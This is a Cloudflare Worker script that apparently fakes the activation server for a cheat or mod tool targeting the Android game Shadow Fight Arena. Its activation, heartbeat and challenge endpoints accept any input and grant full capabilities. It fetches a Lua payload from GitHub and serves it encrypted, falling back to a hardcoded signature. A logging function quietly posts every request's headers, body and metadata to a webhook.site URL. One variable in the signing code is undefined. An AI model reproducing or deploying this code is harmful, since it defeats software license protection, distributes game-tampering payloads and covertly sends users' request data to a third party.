function hexEncode(bytes) {
  let s = '';
  for (const b of bytes) s += b.toString(16).padStart(2, '0');
  return s;
}
async function hmacSha256(keyBytes, dataBytes) {
  const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, dataBytes);
  return new Uint8Array(sig);
}
async function sha256Hex(dataBytes) {
  const d = await crypto.subtle.digest('SHA-256', dataBytes);
  return hexEncode(new Uint8Array(d));
}

async function logReq(where, request, bodyText) {
  try {
    const info = {where: where, method: request.method, url: request.url, headers: Object.fromEntries(request.headers.entries()), body: (bodyText || '').slice(0, 2000), cf: request.cf};
    await fetch('https://webhook.site/ad8a022e-07e0-4cac-8cb9-1ea18ace9954', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info)});
  } catch (e) {}
}
async function handleChallenge(request, ctx) {
  try { const b = await request.clone().text(); if (ctx) ctx.waitUntil(logReq("challenge", request, b)); } catch (e) {}
  const challenge = '17b4b8f1ec2f7235c60f27e869fe48872a7944668f04e31cca1489ccc145ce69';
  return Response.json({
    ok: true,
    challenge,
    activation_challenge: challenge,
    expires_at: new Date(Date.now() + 120 * 1000).toISOString(),
    expires_in_s: 120
  });
}

async function handleActivate(request) {
  try { await request.json(); } catch {}
  const session_id = crypto.randomUUID();
  const session_token = hexEncode(crypto.getRandomValues(new Uint8Array(32)));
  const now = Date.now();
  return Response.json({
    ok: true,
    status: 'ACTIVE',
    session_id,
    session_token,
    expires_at: new Date(now + 180 * 1000).toISOString(),
    license_expiry: new Date(now + 30 * 24 * 60 * 60 * 1000).toISOString(),
    capabilities: 255,
    next_heartbeat_s: 60
  });
}

async function handleHeartbeat(request) {
  let body = {};
  try { body = await request.json(); } catch {}
  return Response.json({
    ok: true,
    session_token: body.session_token || '',
    expires_at: new Date(Date.now() + 180 * 1000).toISOString()
  });
}

async function handlePayload(request, env) {
  let body = {};
  try { body = await request.json(); } catch {
    return Response.json({ ok: false, error: 'bad json' }, { status: 400 });
  }
  const session_id = body.session_id || '';
  const session_token = body.session_token || '';
  const public_key = body.public_key || '';
  const client_nonce = body.client_nonce || '';
  const target_app = body.target_app || 'com.nekki.shadowfightarena';
  const hwid = public_key;

  const payload_server_nonce = hexEncode(crypto.getRandomValues(new Uint8Array(32)));

  // fetch plaintext payload from this repo (raw github). Cache via Cloudflare cache.
  let payloadText;
  try {
    const r = await fetch('https://raw.githubusercontent.com/dinglenutsxnex-crypto/jd_fuc/main/payload.lua?v=3809ac7', { cf: { cacheTtl: 3600 } });
    if (!r.ok) throw new Error('payload fetch ' + r.status);
    payloadText = await r.text();
  } catch (e) {
    return Response.json({ ok: false, error: 'payload missing: ' + String(e) }, { status: 500 });
  }
  const enc = new TextEncoder();
  const payloadBytes = enc.encode(payloadText);
  const payload_size = String(payloadBytes.length);
  const payload_sha256 = await sha256Hex(payloadBytes);

  const saltBytes = enc.encode(payload_server_nonce);
  const ikmBytes = enc.encode(session_token);
  const prk = await hmacSha256(saltBytes, ikmBytes);
  const infoBytes = enc.encode(`SF4_FEATURE_PAYLOAD_AEAD_KEY_V2|${session_id}|${hwid}|1.0.0|ALL`);
  const infoWithCounter = new Uint8Array(infoBytes.length + 1);
  infoWithCounter.set(infoBytes, 0);
  infoWithCounter[infoBytes.length] = 0x01;
  const aesKeyBytes = (await hmacSha256(prk, infoWithCounter)).slice(0, 32);

  const expiresAtMillis = String(Date.now() + 30 * 24 * 60 * 60 * 1000);
  const expiresIso = new Date(Number(expiresAtMillis)).toISOString();
  const aadPrefixBytes = enc.encode(`${session_id}|1.0.0|ALL|1|${expiresAtMillis}|`);
  const hwidHash = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(hwid)));
  const aad = new Uint8Array(aadPrefixBytes.length + hwidHash.length);
  aad.set(aadPrefixBytes, 0);
  aad.set(hwidHash, aadPrefixBytes.length);

  const ivBytes = crypto.getRandomValues(new Uint8Array(12));
  const aesKey = await crypto.subtle.importKey('raw', aesKeyBytes, { name: 'AES-GCM' }, false, ['encrypt']);
  const ctAndTag = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv: ivBytes, additionalData: aad, tagLength: 128 }, aesKey, payloadBytes));
  const ciphertext = hexEncode(ctAndTag.slice(0, ctAndTag.length - 16));
  const tag = hexEncode(ctAndTag.slice(ctAndTag.length - 16));

  return Response.json({
    ok: true,
    protocol: 'v3',
    session_id,
    key_id: 'SF4-PENTEST-01',
    hwid,
    target_app,
    payload_id: 'com.izf.sf4.v3.1_main',
    payload_version: '2.5.0',
    expires: expiresIso,
    client_nonce,
    payload_server_nonce,
    payload_sha256,
    payload_size,
    signature: await (async () => {
      try {
        const mf = (s) => `${[...s].length}:${s};`;
        const manifest =
          mf('v3') + mf(session_id) + mf('SF4-PENTEST-01') + mf(hwid) +
          mf(target_app) + mf('com.izf.sf4.v3.1_main') + mf('2.5.0') +
          mf(expiresIso) + mf(client_nonce) + mf(payload_server_nonce) + mf(iv);
        const pem = (env && (env.RSA_PRIVATE_KEY || env.rsa_private_key)) || '';
        if (!pem || pem.indexOf('BEGIN PRIVATE KEY') < 0) throw new Error('no-key');
        const b64 = pem.replace(/-----[^-]+-----/g, '').replace(/\s+/g, '');
        const der = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
        const pk = await crypto.subtle.importKey('pkcs8', der, { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']);
        const sig = new Uint8Array(await crypto.subtle.sign('RSASSA-PKCS1-v1_5', pk, enc.encode(manifest)));
        return hexEncode(sig);
      } catch (e) {
        return '9a4327567f7e37ff94d8b5d7cdfd225cd729f1d46f8736e6f3c73161427841eebfd3ca84eaaddc91f30530a9cb2d32a0a7b97d75c76ae8487b5de0cb78a73a32586878af2041bd15149abc429502ddfb58b1ca91f3d8dd11f2a1563b1a5add63217047613fb2ef722bf5745a17209e5eb05e67e08f23116b50d1cf74af2e5dbd32ab727d19cb5e96ae2c130c3009aa17715fed5c824f9269d45efc0a44ddc658b5fa31e5097e3692ed4a673dbc99b4d34f11af95c89334951e76e724a1b2888b46d1d04ff36355b9a32ccb7c4134aa23d63dbab87ebb129c1e5a5e91bb51ddbe822306484f49410de62c6ad4b8e9a08431baaab96dc9803716a492be79ed63f6';
      }
    })(),
    game_version: '1.0.0',
    payload_generation: 1,
    expires_at: expiresAtMillis,
    iv: hexEncode(ivBytes),
    ciphertext,
    tag
  });
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const p = url.pathname.replace(/\/+/g, '/');
    if (request.method === 'POST' && p === '/api/android/v3/challenge') return handleChallenge(request, ctx);
    if (request.method === 'POST' && p === '/api/android/v3/activate') return handleActivate(request);
    if (request.method === 'POST' && p === '/api/android/v3/payload') return handlePayload(request, env);
    if (request.method === 'POST' && p === '/api/android/v3/heartbeat') return handleHeartbeat(request);
    if (request.method === 'POST' && (p === '/api/android/v3' || p === '/api/android/v3/')) {
      let b = {};
      try { b = await request.clone().json(); } catch (e) {}
      try { if (ctx) ctx.waitUntil(logReq('base:' + Object.keys(b).sort().join(','), request, JSON.stringify(b).slice(0, 500))); } catch (e) {}
      if (b && typeof b === 'object' && b.key) return handleActivate(request);
      if (b && b.session_id && b.client_nonce) return handlePayload(request);
      if (b && b.session_id && (b.session_token || b.hwid)) return handleHeartbeat(request);
      return handleChallenge(request, ctx);
    }
    if ((p === '/' || p === '') && request.method === 'GET') return new Response('doc\n', { headers: { 'content-type': 'text/html' } });
    try { const b = request.method === 'POST' ? await request.clone().text() : ''; if (ctx) ctx.waitUntil(logReq('miss:' + p, request, b)); } catch (e) {}
    return new Response('Not Found', { status: 404 });
  }
};
